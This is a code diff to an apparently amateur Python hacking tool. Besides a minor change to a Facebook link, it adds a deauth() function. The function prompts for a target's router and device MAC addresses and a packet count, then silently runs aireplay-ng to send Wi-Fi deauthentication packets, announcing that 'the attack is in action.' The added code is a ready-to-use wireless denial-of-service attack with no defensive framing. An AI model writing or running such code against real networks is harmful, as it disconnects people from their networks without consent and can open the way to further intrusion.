@@ -363,7 +363,7 @@ def interct():
     else:
         print(" [Warning] --> The adapter might be disconnected from the network. Please try again - Exiting ..... ")
         time.sleep(2)
-        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/xEyecs")
+        print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
         exit()
 def scanning(ip):
     target = sc.ARP(pdst=ip)
@@ -386,6 +386,14 @@ def invalid():
     print(" [warning] --> Invalid entry, please use a yes or no answer, Exiting .....")
     lines()
     exit()
+def deauth():
+    Intff = getinterf()
+    routmac = input(" [Required] --> Please enter the Mac address of the target's access point(router): ")
+    climac = input(" [Required] --> Please enter the Mac address of the target's device: ")
+    packno = input(" [Required] --> Please enter the number of the deauthentication packets to be sent to the target: ")
+    subprocess.call(['sudo', 'aireplay-ng', '--deauth', packno ,'-a', routmac ,'-c', climac , Intff], stdout=subprocess.DEVNULL)
+    print("\n [Info] --> the attack is in action, if you want to stop the attack please on the left \"ctrl+c\" buttons ")
+    
 def lines():
     print("-------------------------------------------------------------------------------------------------------")
 def TheEnd():
